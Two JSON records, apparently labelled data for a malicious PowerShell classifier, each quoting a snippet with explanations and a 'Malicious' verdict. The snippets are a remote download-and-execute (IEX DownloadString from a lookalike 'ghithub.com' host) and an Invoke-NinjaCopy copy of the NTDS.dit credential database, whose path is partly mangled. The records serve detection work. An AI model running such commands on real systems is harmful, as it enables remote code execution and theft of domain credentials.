{
  "summary": "The script uses PowerShell remoting to execute a script block on a remote system that downloads and runs code from an external HTTP URL.",
  "evidence": [
    {
      "code": "Invoke-Command -ComputerName <remote_system> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject') }",
      "code_explain": "Invoke-Command initiates remote command execution on <remote_system>. Inside the ScriptBlock, New-Object Net.WebClient creates a web client that fetches the raw text from the supplied URL. DownloadString returns that text, and IEX (Invoke‑Expression) immediately executes it as PowerShell code. This pattern is a classic downloader/back‑door technique, allowing an attacker to pull arbitrary scripts from the Internet and run them with the privileges of the invoking user.",
      "tag": "DOWNLOADER"
    },
    {
      "code": "IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')",
      "code_explain": "IEX evaluates a string as PowerShell code, effectively turning the downloaded payload into live commands. Using IEX on data fetched from an untrusted HTTP endpoint bypasses normal script signing or execution‑policy checks, representing a strong defense‑evasion and execution technique.",
      "tag": "EXECUTION"
    },
    {
      "code": "Invoke-Command -ComputerName <remote_system>",
      "code_explain": "Invoke-Command performs remote PowerShell execution, which can be abused for lateral movement or to spread malicious payloads across multiple hosts.",
      "tag": "REMOTE_COMMAND_EXECUTION"
    }
  ],
  "explain": "The script combines remote command execution with a downloader that fetches and runs code from an external, unauthenticated HTTP source. This behavior matches known malicious patterns for initial compromise, lateral movement, and execution of arbitrary payloads, and therefore is classified as malicious.",
  "is_malicious": "Malicious",
  "tag": "DOWNLOADER"
}

{
  "summary": "The script invokes Invoke‑NinjaCopy to copy the NTDS.dit database from the local machine to a remote server.",
  "evidence": [
    {
      "code": "Invoke-NinjaCopy -Path 'C:\\windows;tds;tds.dit' -RemoteDestination 'c:\\windows\\temp;tds.dit' -ComputerName 'Server1'",
      "code_explain": "Invoke‑NinjaCopy is a utility that can read the Active Directory database file (NTDS.dit) and copy it to another location. NTDS.dit contains password hashes and other credential material. Copying it to a remote host is a classic credential‑dumping and data‑exfiltration technique (ATT&CK T1003.007). The command specifies a remote computer name, indicating network‑based exfiltration.",
      "tag": "CREDENTIAL_ACCESS"
    }
  ],
  "explain": "Copying NTDS.dit to a remote destination is a direct attempt to obtain domain credentials, which is a malicious activity regardless of the claimed administrative context. The behavior aligns with credential dumping and exfiltration techniques used by attackers.",
  "is_malicious": "Malicious",
  "tag": "CREDENTIAL_ACCESS"
}

